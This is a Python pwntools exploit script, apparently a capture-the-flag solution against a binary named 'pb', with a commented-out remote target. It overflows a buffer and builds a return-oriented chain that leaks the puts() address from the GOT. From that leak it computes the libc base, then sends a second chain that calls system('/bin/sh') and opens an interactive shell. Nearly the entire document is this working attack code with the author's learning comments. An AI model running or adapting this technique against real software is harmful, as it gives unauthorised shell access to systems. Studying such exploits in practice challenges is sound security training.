#!/usr/bin/env python3

from pwn import *


def main():
    elf = context.binary = ELF('./pb')
    # ELF automatically grabs data about the loaded libc for us
    libc = elf.libc

    # Build payload
    rop = ROP('./pb')
    rop.raw(b'2\x00' + b'Z' * 29 + b'A' * 56)
    rop.puts(elf.got['puts'])
    rop.call(elf.sym['main'])

    # Uncomment only one of these.  remote for remote binary interaciton.
    # The other to run locally and debug
    # p = remote('188.166.152.84', 31871)
    p = elf.debug(gdbscript='handle SIGALRM ignore')

    # Receive and print until user input
    print(p.recvuntil(b">> ").decode('utf-8'))

    # rop.chain() is now equivalent to this payload built with flat()
    # !!!! This payload isn't used, but I left it here for future
    # review and to compare payload building methods
    POP_RDI = p64(rop.rdi.address)
    payload = flat(
        b'2',
        b'\x00',
        b'Z' * 29,
        b'A' * 56,
        POP_RDI,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],
    )

    log.info(b"Sending Payload: " + rop.chain())
    p.sendline(rop.chain())

    # More program output until our injects puts() call
    print('\n'.join([line.decode('utf-8') for line in p.recvlines(4)]))

    # Two bytes in the leaked address are null bytes!
    # So puts() stops printing after 6 bytes.
    # It took me awhile to figure that out.
    libc_puts = p.recv(6)

    # Manually add the two nullbytes to the leaded puts() address
    libc_puts += b'\x00\x00'
    libc_puts = u64(libc_puts)

    # Calculate libc base address
    # We use the actual puts() value leaked from the GOT
    # and subtract the address offset from the libc symbols
    # Updating the address attribute of our libc object
    # will automatically update to other relevant addresses
    # So we can search for the real locations of useful things
    libc.address = libc_puts - libc.sym['puts']
    log.info("\n\nputs() from libc symbols: " + hex(libc.sym['puts']))
    log.success(f'leaked libc puts: {hex(libc_puts)}')
    log.success(f'libc base addres: {hex(libc.address)}')

    # Our payload will now call system('/bin/bash')
    # We need an address pointing to the string '/bin/bash'
    # And we need the address to the system call
    # !!! This is why we needed the actual libc base address
    sh = next(libc.search(b'/bin/sh\x00'))
    sys = libc.sym['system']

    # This time I just used the payload built from flat lol
    payload = flat(
        b'2',
        b'\x00',
        b'Z' * 29,
        b'A' * 56,
        p64(rop.ret.address),  # This fixes 16-byte stack alignment
        POP_RDI,
        p64(sh),
        p64(sys)
    )

    # Receive and print until user input
    print(p.recvuntil(b">> ").decode('utf-8'))

    log.info(b"Sending Payload: " + payload)
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
